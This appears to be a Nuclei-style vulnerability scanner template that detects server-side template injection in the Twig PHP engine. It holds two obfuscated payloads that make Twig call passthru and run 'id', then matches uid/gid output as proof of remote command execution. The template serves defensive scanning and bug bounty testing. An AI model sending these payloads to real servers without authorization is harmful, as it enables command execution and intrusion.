http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  payloads:
    injection:
    - '{%block%20U%}id000passthru{%endblock%}{%set%20x=block(_charset%7Cfirst)%7Csplit(000)%}{{[x%7Cfirst]%7Cmap(x%7Clast)%7Cjoin}}'
    - '{{id~passthru~_context%7Cjoin%7Cslice(2,2)%7Csplit(000)%7Cmap(_context%7Cjoin%7Cslice(5,8))}}'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  skip-variables-check: true
id: twig-ssti
info:
  author: ritikchaddha
  description: 'Twig, a PHP template engine, posed significant challenges in crafting
    a working payload due to its built-in and default configurations, particularly
    in string creation. However, by utilizing the block feature and the built-in _charset
    variable, Attacker successfully developed a payload by nesting these elements
    together.

    '
  metadata:
    max-request: 1
  name: Twig - Server Side Template Injection
  reference:
  - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
  severity: high
  tags: twig,ssti,dast,vuln
